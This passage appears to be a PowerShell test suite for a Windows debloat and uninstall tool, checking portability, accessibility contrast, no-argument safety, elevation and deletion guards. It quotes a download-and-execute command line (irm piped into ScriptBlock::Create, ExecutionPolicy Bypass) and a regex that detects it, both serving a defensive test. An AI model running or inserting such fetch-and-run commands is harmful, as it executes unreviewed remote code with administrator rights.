Test-Phase 'Portability guard' {
    $srcDir = Join-Path $root 'src'
    $problems = [System.Collections.Generic.List[string]]::new()

    foreach ($f in (Get-ChildItem $srcDir -Filter '*.ps1')) {
        $n = $f.Name
        $lines = Get-Content -LiteralPath $f.FullName
        $inHelp = $false
        for ($i = 0; $i -lt $lines.Count; $i++) {
            $line = $lines[$i]
            # Comment-based help legitimately names the very things this guard
            # looks for, in the course of explaining why not to use them.
            if ($line -match '<#') { $inHelp = $true }
            if ($inHelp) { if ($line -match '#>') { $inHelp = $false }; continue }
            if ($line -match '^\s*#') { continue }
            $where = "$n line $($i + 1)"

            # A literal drive letter is always someone's specific machine.
            if ($line -match "['\`"][D-Zd-z]:\\\\" -and $line -notmatch 'HK[A-Z]+:|env:|Join-Path|XboxGames|SteamLibrary') {
                $problems.Add("$where hardcodes a drive path") | Out-Null
            }
            # WOW6432Node written by hand does not exist on 32-bit Windows.
            #
            # Building a path with it is the fault. Testing whether a path you
            # were handed happens to be the 32-bit one is not, so a bare quoted
            # token in a comparison is allowed - the previous rule flagged that
            # too, which is a false positive that pushes people towards worse
            # code to appease the test.
            $buildsPath = $line -match '\\WOW6432Node' -or $line -match 'WOW6432Node\\'
            if ($buildsPath -and $line -notmatch 'Get-SoftwareHivePaths|Is64BitOperatingSystem') {
                $problems.Add("$where hardcodes WOW6432Node instead of using Get-SoftwareHivePaths") | Out-Null
            }
            # ProgramFiles(x86) is undefined on 32-bit Windows.
            if ($line -match '\$\{env:ProgramFiles\(x86\)\}' -and $n -ne '03-detect.ps1') {
                $problems.Add("$where uses ProgramFiles(x86) directly instead of Get-ProgramFilesRoots") | Out-Null
            }
            # Adapter DisplayName/DisplayValue are translated strings.
            if ($line -match '(DisplayName|DisplayValue)\s+-match' -and $n -eq '10-network.ps1') {
                $problems.Add("$where matches a localised adapter string; use RegistryKeyword") | Out-Null
            }
        }
    }
    if ($problems.Count -gt 0) { throw ($problems -join '; ') }
}

# The camera/mic/screen-capture carve-out is the promise most likely to be broken
# by a careless edit to the deny list.
Test-Phase 'Window is legible and keyboard-navigable' {
    $problems = [System.Collections.Generic.List[string]]::new()
    $xaml = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '13-gui.ps1')

    # Custom ControlTemplates replace the default focus adorner. Every one of
    # them has to put something back, or a keyboard user cannot see where they
    # are. All three shipped without it.
    foreach ($ctrl in @('Btn', 'Nav')) {
        $block = [regex]::Match($xaml, "(?s)x:Key=""$ctrl"".*?</Style>")
        if (-not $block.Success) { $problems.Add("style $ctrl not found") | Out-Null; continue }
        if ($block.Value -notmatch 'IsKeyboardFocused') {
            $problems.Add("$ctrl has no keyboard focus indicator") | Out-Null
        }
    }
    $cb = [regex]::Match($xaml, '(?s)<Style TargetType="CheckBox">.*?</Style>')
    if (-not $cb.Success) { $problems.Add('CheckBox style not found') | Out-Null }
    elseif ($cb.Value -notmatch 'IsKeyboardFocused') {
        $problems.Add('CheckBox has no keyboard focus indicator') | Out-Null
    }

    # Text colours, measured rather than eyeballed. Faint is the secondary line
    # on every row and shipped at 3.0:1 on a raised panel.
    Add-Type -AssemblyName System.Drawing
    function Get-RelLum([string]$hex) {
        $c = [System.Drawing.ColorTranslator]::FromHtml($hex)
        $v = @($c.R, $c.G, $c.B) | ForEach-Object {
            $x = $_ / 255
            if ($x -le 0.03928) { $x / 12.92 } else { [Math]::Pow(($x + 0.055) / 1.055, 2.4) }
        }
        0.2126 * $v[0] + 0.7152 * $v[1] + 0.0722 * $v[2]
    }
    function Get-Contrast($a, $b) {
        $x = Get-RelLum $a; $y = Get-RelLum $b
        ([Math]::Max($x, $y) + 0.05) / ([Math]::Min($x, $y) + 0.05)
    }

    # Pulled from the XAML so the test cannot drift from the palette.
    $named = @{}
    foreach ($m in [regex]::Matches($xaml, '<SolidColorBrush x:Key="(\w+)"\s+Color="(#[0-9A-Fa-f]{6})"')) {
        $named[$m.Groups[1].Value] = $m.Groups[2].Value
    }
    foreach ($k in @('Ink', 'Soft', 'Faint')) {
        if (-not $named.ContainsKey($k)) { $problems.Add("brush $k missing from the palette") | Out-Null; continue }
        foreach ($bg in @('#171C1B', '#1E2524', '#263130')) {
            $r = [Math]::Round((Get-Contrast $named[$k] $bg), 2)
            if ($r -lt 4.5) {
                $problems.Add("$k ($($named[$k])) is $r`:1 on $bg - under AA for body text") | Out-Null
            }
        }
    }

    # Checking only the palette was not enough. The palette's dim grey was
    # fixed once and the panes kept their own hardcoded copies of the old
    # value, so publisher, version and size - the lines somebody reads before
    # pressing Remove - stayed at 3:1 while this guard reported everything
    # fine. Every colour the code actually paints text with is checked now,
    # wherever it is written.
    $srcGui = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '13-gui.ps1')

    # A disabled control is exempt: WCAG 1.4.3 excludes text that is part of an
    # inactive component, and dimming is how "you cannot press this" is said.
    # Nothing else is exempt.
    $srcGui = [regex]::Replace($srcGui,
        '(?s)<Trigger Property="IsEnabled" Value="False">.*?</Trigger>', '')

    $textColours = @{}
    $patterns = @(
        # XAML: an explicit foreground on a TextBlock or a template part.
        @{ Rx = 'Foreground="(#[0-9A-Fa-f]{6})"';            What = 'a XAML Foreground' }
        # Add-GuiParagraph paints its text with whatever -Colour it is given.
        @{ Rx = "-Colour\s+'(#[0-9A-Fa-f]{6})'";             What = 'an Add-GuiParagraph -Colour' }
        # Assigned straight onto a control's Foreground.
        @{ Rx = "\.Foreground\s*=\s*Get-GuiBrush\s+'(#[0-9A-Fa-f]{6})'"; What = 'a .Foreground assignment' }
        # The file's convention: $brInk / $brFaint / $brSoft are text brushes.
        # $brRule and friends are borders and are deliberately not included.
        @{ Rx = "\`$br(?:Ink|Faint|Soft|Text)\w*\s*=\s*Get-GuiBrush\s+'(#[0-9A-Fa-f]{6})'"; What = 'a text brush' }
    )
    foreach ($p in $patterns) {
        foreach ($m in [regex]::Matches($srcGui, $p.Rx)) {
            $textColours[$m.Groups[1].Value.ToUpper()] = $p.What
        }
    }
    if ($textColours.Count -lt 4) {
        $problems.Add("only $($textColours.Count) text colour(s) found in the window - this guard has stopped finding them") | Out-Null
    }
    foreach ($hex in $textColours.Keys) {
        # The accent is a fill behind dark text, not a text colour on the
        # panels, and the near-black that sits on top of it is its partner.
        if ($hex -in @('#46C6B0', '#06211D', '#5AD6C0')) { continue }
        foreach ($bg in @('#171C1B', '#1E2524', '#263130')) {
            $r = [Math]::Round((Get-Contrast $hex $bg), 2)
            if ($r -lt 4.5) {
                $problems.Add("$hex ($($textColours[$hex])) is $r`:1 on $bg - under AA for body text") | Out-Null
            }
        }
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Elevation never downloads and executes' {
    # Microsoft Defender flagged Trojan:Win32/Commando.A!ml on this command
    # line - a detection on the command line, not on any file:
    #
    #   pwsh -ExecutionPolicy Bypass -NoProfile -NoExit -Command
    #        &([ScriptBlock]::Create((irm 'https://trimbloat.com/go')))
    #
    # It is also unsafe on its own terms: it fetches again inside the elevated
    # process and runs whatever comes back, so what receives administrator is
    # not provably what the user read. There were two such call sites.
    $problems = [System.Collections.Generic.List[string]]::new()

    foreach ($f in (Get-ChildItem (Join-Path $root 'src') -Filter '*.ps1')) {
        $lines = Get-Content -LiteralPath $f.FullName
        $inHelp = $false
        for ($i = 0; $i -lt $lines.Count; $i++) {
            $line = $lines[$i]
            # Comment-based help quotes the exact pattern this guard looks for,
            # in the course of explaining why it is gone.
            if ($line -match '<#') { $inHelp = $true }
            if ($inHelp) { if ($line -match '#>') { $inHelp = $false }; continue }
            if ($line -match '^\s*#') { continue }
            # The winutil handoff is a documented, deliberate execution of a
            # third-party script; it is not an elevation command line.
            if ($line -match 'WinUtilSource') { continue }
            if ($line -match "ScriptBlock\]::Create\(\(\s*irm" -or
                $line -match "ScriptBlock\]::Create\(\(Invoke-RestMethod") {
                if ($line -notmatch 'WinUtilSource') {
                    $problems.Add("$($f.Name) line $($i + 1) builds a download-and-execute command") | Out-Null
                }
            }
        }
    }

    # Every elevation must hand over a file and a hash to check it against.
    $head = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '01-header.ps1')
    $main = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '99-main.ps1')
    foreach ($pair in @(@{ N = '01-header.ps1'; T = $head }, @{ N = '99-main.ps1'; T = $main })) {
        if ($pair.T -match "Start-Process \`$shell -Verb RunAs" -and $pair.T -notmatch 'ElevationHash') {
            $problems.Add("$($pair.N) elevates without pinning a hash") | Out-Null
        }
    }
    if ($main -notmatch 'Get-StagedSelf' -or $head -notmatch 'function Get-StagedSelf') {
        $problems.Add('the staged-self helper is missing from an elevation path') | Out-Null
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'The one-liner actually works' {
    # This shipped broken. `irm | iex` is how essentially everyone runs this,
    # and it failed on the very first statement:
    #     Invoke-Expression: Unexpected attribute 'CmdletBinding'.
    # Invoke-RestMethod passes a UTF-8 byte order mark through as a literal
    # U+FEFF, and Invoke-Expression cannot parse a script starting with one.
    # Everything else passed, because the build parsed the artefact from disk
    # where the mark is a mark rather than a character.
    $artefact = Join-Path $root 'trim.ps1'
    if (-not (Test-Path -LiteralPath $artefact)) { throw 'trim.ps1 has not been built' }

    $problems = [System.Collections.Generic.List[string]]::new()

    $bytes = [System.IO.File]::ReadAllBytes($artefact)
    if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
        $problems.Add('the artefact starts with a UTF-8 BOM, which breaks irm | iex') | Out-Null
    }

    # No BOM is only safe while the file is pure ASCII; anything else needs one
    # to survive being saved and re-read under Windows PowerShell.
    $text = [System.IO.File]::ReadAllText($artefact)
    $nonAscii = @($text.ToCharArray() | Where-Object { [int]$_ -gt 127 })
    if ($nonAscii.Count) {
        $seen = ($nonAscii | Select-Object -Unique -First 5 | ForEach-Object { 'U+{0:X4}' -f [int]$_ }) -join ', '
        $problems.Add("the artefact has $($nonAscii.Count) non-ASCII character(s) ($seen) so it would need a BOM") | Out-Null
    }

    # The failing operation itself: build a script block from the text exactly
    # as Invoke-Expression would.
    try { $null = [scriptblock]::Create($text) }
    catch { $problems.Add("iex cannot parse the artefact: $($_.Exception.Message)") | Out-Null }

    # And confirm the guard still detects the original fault.
    try {
        $null = [scriptblock]::Create(([string][char]0xFEFF) + $text)
        $problems.Add('a leading BOM no longer breaks parsing - this test can no longer detect the fault') | Out-Null
    } catch { }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'A run with no arguments never applies anything' {
    # This shipped, and it stripped the machine of the person who ran it.
    # `irm https://trimbloat.com/go | iex` passes no parameters, so -Gui was
    # $false, -DryRun was $false, and Invoke-Main fell past the window branch
    # into the plain command-line branch: restore point, then every phase
    # applied, with no window and nothing asked. The site and the README both
    # promise the opposite - "nothing on your PC changes until you click
    # Apply" - so this is the guard for the claim, not just for the code.
    $artefact = Join-Path $root 'trim.ps1'
    if (-not (Test-Path -LiteralPath $artefact)) { throw 'trim.ps1 has not been built' }

    $problems = [System.Collections.Generic.List[string]]::new()

    $errors = $null
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($artefact, [ref]$null, [ref]$errors)
    if ($errors) { throw "the artefact does not parse: $($errors[0].Message)" }

    $mainFn = $ast.Find({
        param($a)
        $a -is [System.Management.Automation.Language.FunctionDefinitionAst] -and $a.Name -eq 'Invoke-Main'
    }, $true)
    if (-not $mainFn) { throw 'Invoke-Main is not in the artefact' }

    # ---- 1. The decision itself, executed rather than pattern-matched. -----
    # Find the statement that forces the window on, and run its real condition
    # against every way of invoking the script. A hard-coded $true or $false
    # cannot satisfy both halves of this matrix.
    $decision = $mainFn.Find({
        param($a)
        $a -is [System.Management.Automation.Language.IfStatementAst] -and
        $a.Clauses[0].Item1.Extent.Text -match '\$Apply'
    }, $true)

    if (-not $decision) {
        $problems.Add('Invoke-Main no longer decides whether to open the window; a bare run may apply changes') | Out-Null
    }
    else {
        $condition = [scriptblock]::Create($decision.Clauses[0].Item1.Extent.Text)

        # Each case: the switches that are set, and whether the window should
        # be forced on. Everything that is not an explicit instruction to do
        # something else has to land on the window.
        $cases = @(
            @{ Set = @();                   Window = $true;  Why = 'no arguments at all - this is `irm | iex`' }
            @{ Set = @('Apply');            Window = $false; Why = '-Apply' }
            @{ Set = @('DryRun');           Window = $false; Why = '-DryRun' }
            @{ Set = @('Gui');              Window = $false; Why = '-Gui (already the window)' }
            @{ Set = @('Cleanup');          Window = $false; Why = '-Cleanup' }
            @{ Set = @('LargeFiles');       Window = $false; Why = '-LargeFiles' }
            @{ Set = @('ApplySelection');   Window = $false; Why = 'an elevated apply of a saved selection' }
            @{ Set = @('CleanupSelection'); Window = $false; Why = 'an elevated cleanup of a saved selection' }
        )

        foreach ($case in $cases) {
            # Switches default to $false, the two internal ones to ''; a set
            # string parameter carries a path.
            $Gui = $false; $Apply = $false; $DryRun = $false
            $Cleanup = $false; $LargeFiles = $false
            $ApplySelection = ''; $CleanupSelection = ''
            foreach ($name in $case.Set) {
                if ($name -match 'Selection$') { Set-Variable -Name $name -Value 'C:\some\file.json' }
                else                           { Set-Variable -Name $name -Value $true }
            }

            $forcesWindow = [bool](& $condition)
            if ($forcesWindow -ne $case.Window) {
                $expected = if ($case.Window) { 'open the window' } else { 'be left alone' }
                $problems.Add("with $($case.Why) the run should $expected, and does not") | Out-Null
            }
        }

        # And the body of that decision has to actually turn the window on.
        if ($decision.Clauses[0].Item2.Extent.Text -notmatch '(?s)Set-Variable.+-Name\s+Gui.+\$true') {
            $problems.Add('the no-arguments branch no longer switches the window on') | Out-Null
        }
    }

    # ---- 2. The second line of defence, at the apply branch itself. --------
    # The check above is one edit away from being wrong. The branch that does
    # the applying refuses to run without an explicit instruction, so removing
    # or breaking the check above cannot on its own resurrect the fault.
    $text  = $mainFn.Extent.Text
    $plain = $text.Substring($text.IndexOf('# Plain command line'))
    if ($plain -notmatch '(?s)if \(-not \(\$Apply -or \$DryRun\)\).+?return') {
        $problems.Add('the plain command-line branch applies changes without requiring -Apply or -DryRun') | Out-Null
    }
    if ($plain.IndexOf('Invoke-AllPhases') -lt $plain.IndexOf('$Apply -or $DryRun')) {
        $problems.Add('the plain command-line branch reaches Invoke-AllPhases before checking for -Apply') | Out-Null
    }

    # ---- 3. A host with no window must not become an unattended apply. -----
    if ($text -notmatch '(?s)Test-CanShowGui.+?Set-Variable -Name DryRun -Value \$true') {
        $problems.Add('a host that cannot show a window falls through to applying changes instead of printing the plan') | Out-Null
    }

    # ---- 4. Nothing happens to the machine before the window appears. ------
    # Including the restore point, which is the slowest thing in the script:
    # two minutes of a progress bar, before a window that has not appeared.
    $guiBranch = $text.Substring($text.IndexOf('if ($Gui) {'))
    $upToWindow = $guiBranch.Substring(0, $guiBranch.IndexOf('Show-TrimWindow'))
    if ($upToWindow -match 'New-SafetyRestorePoint') {
        $problems.Add('a restore point is created before the window is shown') | Out-Null
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'The winutil handoff survives our own strict mode' {
    # The phase failed on its first statement, every time it ran, with
    #   The property 'runspace' cannot be found on this object.
    # That is not a winutil bug. This script sets Set-StrictMode -Version 2.0
    # and everything it invokes inherits it; winutil reads $sync.runspace on a
    # hashtable that does not always carry the key, which is $null normally and
    # a terminating error under strict mode. The tweak set never applied, and
    # the failure was reported as winutil's.
    $problems = [System.Collections.Generic.List[string]]::new()

    # 1. The mechanism, confirmed on this host rather than assumed. If a future
    #    PowerShell stops throwing here, this guard has nothing left to protect
    #    and should say so instead of passing quietly.
    $reader = [scriptblock]::Create('$h = @{}; $h.runspace')
    $threw = $false
    Set-StrictMode -Version 2.0
    try { $null = & $reader } catch { $threw = $true }
    if (-not $threw) {
        $problems.Add('strict mode no longer throws on a missing hashtable key - this guard is obsolete') | Out-Null
    }
    # And that turning it off is genuinely the remedy.
    Set-StrictMode -Off
    try { $null = & $reader } catch { $problems.Add('Set-StrictMode -Off does not stop the error the winutil phase hit') | Out-Null }
    Set-StrictMode -Version 2.0

    # 2. The handoff still does it. Everything between creating the script
    #    block and invoking it has to leave strict mode off.
    $wu = Get-Content -Raw -Encoding UTF8 -LiteralPath (Join-Path (Join-Path $root 'src') '04-winutil.ps1')
    if ($wu -notmatch '(?s)ScriptBlock\]::Create.+?Set-StrictMode -Off.+?& \$block -Config') {
        $problems.Add('the winutil handoff invokes winutil under strict mode, which it cannot survive') | Out-Null
    }
    # 3. And puts it back, so the rest of the run keeps the protection.
    if ($wu -notmatch '(?s)& \$block -Config.+?Set-StrictMode -Version 2\.0') {
        $problems.Add('the winutil handoff leaves strict mode off for the rest of the run') | Out-Null
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'The folder guard and the key guard agree' {
    # Four faults in this file in one day, every one of them the same shape: a
    # rule reasoned out carefully for folders and never mirrored to keys, or
    # the reverse. The containment rule, the re-check before deleting, the
    # protected-publisher names, and the requirement to live under a known
    # root. Each half was written well; neither was written twice.
    #
    # So this asserts the two guards behave the same way on the cases they
    # should both refuse, rather than testing each of them alone and trusting
    # that somebody remembered the other one.
    $problems = [System.Collections.Generic.List[string]]::new()

    $pf   = @(Get-ProgramFilesRoots)[0]
    $hive = @(Get-SoftwareHivePaths '')[-1]

    # Each case: what it is, the folder to try, the key to try, and the app
    # asking. Both guards must say no to all of them.
    $mustRefuse = @(
        @{ Why = 'a shared-vendor name that is on the protected list'
           Path = (Join-Path $pf 'NVIDIA'); Key = "$hive\NVIDIA"
           App = 'NVIDIA'; Pub = 'Some Bundled Tool Vendor' }
        @{ Why = 'a name that is shared infrastructure'
           Path = (Join-Path $pf 'Common Files'); Key = "$hive\Common Files"
           App = 'Common Files'; Pub = 'Whoever' }
        @{ Why = 'somewhere applications do not live'
           Path = 'C:\Windows\System32\SomeApp'; Key = 'HKCU:\Volatile Environment\SomeApp'
           App = 'SomeApp'; Pub = 'Whoever' }
        @{ Why = 'a root rather than something inside one'
           Path = $pf; Key = $hive
           App = 'Anything'; Pub = 'Whoever' }
        @{ Why = 'a name too short to be evidence of anything'
           Path = (Join-Path $pf 'Q'); Key = "$hive\Q"
           App = 'Q'; Pub = 'Whoever' }
        @{ Why = 'nothing to do with the app being removed'
           Path = (Join-Path $pf 'CompletelyUnrelatedThing'); Key = "$hive\CompletelyUnrelatedThing"
           App = 'SomethingElseEntirely'; Pub = 'Whoever' }
    )

    foreach ($c in $mustRefuse) {
        if (Test-SafeToRemovePath -Path $c.Path -AppName $c.App -Publisher $c.Pub) {
            $problems.Add("the folder guard allows $($c.Why): '$($c.Path)'") | Out-Null
        }
        if (Test-SafeToRemoveKey -Key $c.Key -AppName $c.App -Publisher $c.Pub) {
            $problems.Add("the key guard allows $($c.Why): '$($c.Key)'") | Out-Null
        }
    }

    # Both must still say yes to the ordinary case, or the agreement above
    # would be satisfied by two guards that refuse everything.
    $okPath = Join-Path $pf 'ContosoWidgetStudio'
    $okKey  = "$hive\ContosoWidgetStudio"
    if (-not (Test-SafeToRemovePath -Path $okPath -AppName 'Contoso Widget Studio' -Publisher 'Contoso')) {
        $problems.Add("the folder guard refuses an ordinary product folder: '$okPath'") | Out-Null
    }
    if (-not (Test-SafeToRemoveKey -Key $okKey -AppName 'Contoso Widget Studio' -Publisher 'Contoso')) {
        $problems.Add("the key guard refuses an ordinary product key: '$okKey'") | Out-Null
    }

    if ($problems.Count) { throw ($problems -join '; ') }
}

Test-Phase 'Deletion re-checks the list it was handed' {
    # The folder branch of Remove-AppLeftovers had always re-run its guard
    # immediately before deleting - "in case anything mutated the list between
    # the scan and the confirmation". The registry branch deleted whatever it
    # was given. Same file, same reasoning, applied to one half of it.
    #
    # This runs the real deletion, not a dry run, because a guard that only
    # ever executes in dry mode is not a guard. Everything it is pointed at
    # belongs to this test: the decoys are scratch locations that do not match
    # the app, so if the check fails, the only thing lost is the test's own
    # data - and the test says so.
    $stamp  = [Guid]::NewGuid().ToString('N').Substring(0, 8)
    $appName = "TrimDelGuard$stamp"
    $pubName = "TrimDelGuardVendor$stamp"

    $mineDir   = Join-Path $env:LOCALAPPDATA $appName
    $victimDir = Join-Path $env:LOCALAPPDATA "TrimVictim$stamp"
    $mineKey   = "HKCU:\Software\$appName"
    $victimKey = "HKCU:\Software\TrimVictim$stamp"

    $wasDry = $DryRun
    try {
        foreach ($d in @($mineDir, $victimDir)) { New-Item -ItemType Directory -Force -Path $d | Out-Null }
        Set-Content -LiteralPath (Join-Path $victimDir 'not-yours.txt') -Value 'must survive'
        foreach ($k in @($mineKey, $victimKey)) { New-Item -Path $k -Force | Out-Null }
        Set-ItemProperty -LiteralPath $victimKey -Name 'Keep' -Value 1

        # A list where two entries do not belong to this app, every one ticked -
        # which is what a mutated or faulty list looks like from in here.
        $list = @(
            [pscustomobject]@{ Kind='folder';   Path=$mineDir;   Bytes=0; Size='0 B'; Selected=$true; Key="left|folder|$mineDir" },
            [pscustomobject]@{ Kind='folder';   Path=$victimDir; Bytes=0; Size='0 B'; Selected=$true; Key="left|folder|$victimDir" },
            [pscustomobject]@{ Kind='registry'; Path=$mineKey;   Bytes=0; Size='';    Selected=$true; Key="left|registry|$mineKey" },
            [pscustomobject]@{ Kind='registry'; Path=$victimKey; Bytes=0; Size='';    Selected=$true; Key="left|registry|$victimKey" }
        )

        Set-Variable -Name DryRun -Value $false -Scope Script
        $result = Remove-AppLeftovers -Leftovers $list -AppName $appName -Publisher $pubName
        Set-Variable -Name DryRun -Value $wasDry -Scope Script

        $problems = [System.Collections.Generic.List[string]]::new()

        if (Test-Path -LiteralPath $victimDir) {
            # Good. Prove it is intact rather than merely present.
            if (-not (Test-Path -LiteralPath (Join-Path $victimDir 'not-yours.txt'))) {
                $problems.Add('the folder that does not belong to this app was emptied') | Out-Null
            }
        } else {
            $problems.Add("'$victimDir' does not belong to $appName and was deleted anyway") | Out-Null
        }
        if (-not (Test-Path -LiteralPath $victimKey)) {
            $problems.Add("'$victimKey' does not belong to $appName and was deleted anyway") | Out-Null
        }

        # And the guard must not have become so strict that it refuses
        # everything - that would "pass" the checks above for the wrong reason.
        if (Test-Path -LiteralPath $mineDir) { $problems.Add("the app's own folder was not removed") | Out-Null }
        if (Test-Path -LiteralPath $mineKey) { $problems.Add("the app's own registry key was not removed") | Out-Null }
        if ($result.Removed -ne 2) { $problems.Add("expected 2 removals, got $($result.Removed)") | Out-Null }
        if ($result.Skipped -ne 2) { $problems.Add("expected 2 refusals, got $($result.Skipped)") | Out-Null }

        if ($problems.Count) { throw ($problems -join '; ') }
    }
    finally {
        Set-Variable -Name DryRun -Value $wasDry -Scope Script
        foreach ($d in @($mineDir, $victimDir)) { Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
        foreach ($k in @($mineKey, $victimKey)) { Remove-Item -LiteralPath $k -Recurse -Force -ErrorAction SilentlyContinue }
    }
}

Test-Phase 'Uninstalling one product never offers another product''s data' {
    # Get-AppLeftovers had unit guards on its two filters and had never been
    # driven end to end. Doing that found this: uninstalling one product from a
    # vendor offered the vendor's whole folder, ticked by default, with every
    # other product from that vendor inside it. Remove Photoshop, lose
    # Lightroom's settings.
    #
    # Test-SafeToRemoveKey had refused exactly this on the registry side since
    # it was written. The same reasoning had never reached the filesystem.
    $stamp   = [Guid]::NewGuid().ToString('N').Substring(0, 8)
    $vendor  = "TrimGuardVendor$stamp"
    $appOne  = "TrimGuardProductOne$stamp"
    $appTwo  = "TrimGuardProductTwo$stamp"

    $vendorDir = Join-Path $env:LOCALAPPDATA $vendor
    $oneDir    = Join-Path $vendorDir $appOne
    $twoDir    = Join-Path $vendorDir $appTwo
    $soloRoot  = Join-Path $env:LOCALAPPDATA "TrimSoloVendor$stamp"
    $soloDir   = Join-Path $soloRoot $appOne
    $vendorKey = "HKCU:\Software\$vendor"
    $soloKey   = "HKCU:\Software\TrimSoloVendor$stamp"

    $app = [pscustomobject]@{
        Name = $appOne; Publisher = $vendor; Version = '1.0'
        DisplayName = $appOne; PublisherDisplay = $vendor
        InstallDir = ''; Uninstall = ''; QuietUninstall = ''; IconSource = ''
        SizeMB = 0; RegistryKey = ''; Kind = 'win32'
    }

    try {
        $problems = [System.Collections.Generic.List[string]]::new()

        # --- Two products under one vendor. ---------------------------------
        foreach ($d in @($oneDir, $twoDir)) { New-Item -ItemType Directory -Force -Path $d | Out-Null }
        Set-Content -LiteralPath (Join-Path $twoDir 'irreplaceable.cfg') -Value 'a different product'

        $paths = @(Get-AppLeftovers -App $app | Where-Object { $_.Kind -eq 'folder' } | ForEach-Object { $_.Path })
        if ($paths -contains $vendorDir) {
            $problems.Add("the vendor folder '$vendorDir' is offered, and '$appTwo' lives inside it") | Out-Null
        }
        if ($paths -contains $twoDir) {
            $problems.Add("another product's folder '$twoDir' is offered directly") | Out-Null
        }
        if ($paths -notcontains $oneDir) {
            $problems.Add("the folder actually belonging to the app, '$oneDir', is not offered") | Out-Null
        }

        # --- The same vendor, holding nothing but this product. --------------
        # The rule is "only this product is in it", not "never the vendor
        # folder" - otherwise an empty vendor folder is left behind forever.
        New-Item -ItemType Directory -Force -Path $soloDir | Out-Null
        $soloApp = $app.PSObject.Copy()
        $soloApp.Publisher = "TrimSoloVendor$stamp"
        $soloApp.PublisherDisplay = $soloApp.Publisher
        $soloPaths = @(Get-AppLeftovers -App $soloApp | Where-Object { $_.Kind -eq 'folder' } | ForEach-Object { $_.Path })
        if ($soloPaths -notcontains $soloRoot) {
            $problems.Add("a vendor folder holding only this product is not offered, so it would be left behind empty") | Out-Null
        }

        # --- The registry side, which has always been right. -----------------
        # Asserted in both directions on purpose. Checking only that a shared
        # publisher key is refused would pass just as well if publisher keys
        # were never offered at all - a test that cannot fail either way.
        New-Item -Path $vendorKey -Force | Out-Null
        New-Item -Path (Join-Path $vendorKey $appOne) -Force | Out-Null
        New-Item -Path (Join-Path $vendorKey $appTwo) -Force | Out-Null
        $keys = @(Get-AppLeftovers -App $app | Where-Object { $_.Kind -eq 'registry' } | ForEach-Object { $_.Path })
        if ($keys -contains $vendorKey) {
            $problems.Add("the vendor registry key '$vendorKey' is offered while another product is under it") | Out-Null
        }

        New-Item -Path $soloKey -Force | Out-Null
        New-Item -Path (Join-Path $soloKey $appOne) -Force | Out-Null
        $soloKeys = @(Get-AppLeftovers -App $soloApp | Where-Object { $_.Kind -eq 'registry' } | ForEach-Object { $_.Path })
        if ($soloKeys -notcontains $soloKey) {
            $problems.Add("a publisher key holding only this product is not offered, so it would be left behind") | Out-Null
        }

        # Leftovers are ticked on arrival, so every one of them has to be
        # something the user would agree belongs to what they just removed.
        if ($problems.Count) { throw ($problems -join '; ') }
    }
    finally {
        foreach ($d in @($vendorDir, $soloRoot)) {
            Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
        }
        foreach ($k in @($vendorKey, $soloKey)) {
            Remove-Item -LiteralPath $k -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

Test-Phase 'The large-file report only reports' {
    # The last feature never driven end to end. It deletes nothing, which is
    # the whole design: a large file is not a junk file, and a 40 GB game, a
    # 40 GB video project and a 40 GB forgotten ISO look identical from here.
    # So what is being checked is that it stays a report, that it counts each
    # file once, and that the things nobody should touch are labelled as such.
    $dir = Join-Path ([IO.Path]::GetTempPath()) "trim-large-$([Guid]::NewGuid().ToString('N'))"
    $sub = Join-Path $dir 'sub'
    New-Item -ItemType Directory -Force -Path $sub | Out-Null

    try {
        $problems = [System.Collections.Generic.List[string]]::new()

        # Distinct sizes, and the LARGEST one deepest. With the biggest file in
        # the root the walk reaches it first anyway, so an unranked result and
        # a ranked one look identical and the ordering assertion proves nothing.
        [IO.File]::WriteAllBytes((Join-Path $dir 'root-medium.bin'), (New-Object byte[] (2MB)))
        [IO.File]::WriteAllBytes((Join-Path $sub 'deep-largest.bin'), (New-Object byte[] (3MB)))
        [IO.File]::WriteAllBytes((Join-Path $dir 'too-small.bin'), (New-Object byte[] (64KB)))

        # A junction is a second path into a directory already being walked.
        # Following one double-counts everything under it, and on a profile
        # with a loop in it the walk never finishes.
        $link = Join-Path $dir 'link-to-sub'
        $madeLink = $false
        try {
            New-Item -ItemType Junction -Path $link -Target $sub -ErrorAction Stop | Out-Null
            $madeLink = $true
        } catch { }

        $rows = @(Get-LargeFileScan -Roots @($dir) -MinimumMB 1 -Top 50 -TimeoutSeconds 30)

        if ($rows.Count -ne 2) {
            throw "expected 2 files over the threshold, got $($rows.Count): $(($rows | ForEach-Object { $_.Path }) -join ', ')"
        }
        if (@($rows | Where-Object { $_.Path -like '*too-small*' }).Count) {
            $problems.Add('a file under the threshold was reported') | Out-Null
        }
        if ($madeLink -and @($rows | Where-Object { $_.Path -like "$link*" }).Count) {
            $problems.Add('the scan walked a junction, so files under it are counted twice') | Out-Null
        }
        if (@($rows | Where-Object { $_.Bytes -lt 1MB }).Count) {
            $problems.Add('a row is smaller than the minimum it was asked for') | Out-Null
        }
        # Biggest first, or "the largest N" means nothing.
        if ($rows[0].Path -notlike '*deep-largest*') {
            $problems.Add("the report is not ordered largest first: '$($rows[0].Path)' came first") | Out-Null
        }

        # Report only. Nothing here may carry the fields that make a row
        # selectable or deletable anywhere else in this program.
        foreach ($r in $rows) {
            foreach ($f in @('Selected', 'Key')) {
                if ($r.PSObject.Properties.Name -contains $f) {
                    $problems.Add("a large-file row carries '$f', which is what makes a row deletable") | Out-Null
                }
            }
            if (-not $r.Kind) { $problems.Add("'$($r.Path)' has no description, so the list is just paths") | Out-Null }
        }

        # -Top is the difference between a report and a wall of text.
